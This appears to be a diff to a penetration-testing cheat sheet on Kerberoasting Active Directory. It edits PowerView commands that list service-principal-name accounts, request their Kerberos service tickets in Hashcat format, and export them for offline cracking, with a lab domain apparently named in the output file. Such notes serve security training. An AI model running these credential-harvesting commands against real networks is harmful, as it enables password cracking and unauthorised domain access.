@@ -29,14 +29,12 @@ grep -i "serviceprincipalname" dump.txt
 ============ From Windows ============
 # SPN Users
 Import-Module .\PowerView.ps1
-Get-DomainUser * -spn | select samaccountname
-Get-DomainUser -SPNTicket -Verbose | Select samaccountname,serviceprincipalname
-Get-DomainUser | Where {$_.serviceprincipalname -ne $null} -PipelineVariable User | ForEach-Object {Get-DomainSPNTicket $User.ServicePrincipalName | Select $User.samaccountname}
-Get-DomainUser -SPNTicket | ?{$_.EncryptionType -eq 'RC4-HMAC'}
-Get-DomainUser -LDAPFilter "(&(servicePrincipalName=*)(admincount=1))"
+Get-DomainUser * -spn | select samaccountname,serviceprincipalname
+Get-DomainUser -LDAPFilter "(&(servicePrincipalName=*)(admincount=1))" | Select Name
 Get-DomainUser -SPN -Properties samaccountname,admincount,pwdlastset,msds-supportedencryptiontypes
 
 Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+tr -d ' \n' < messy_hash.txt > clean_hash.txt
 
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 
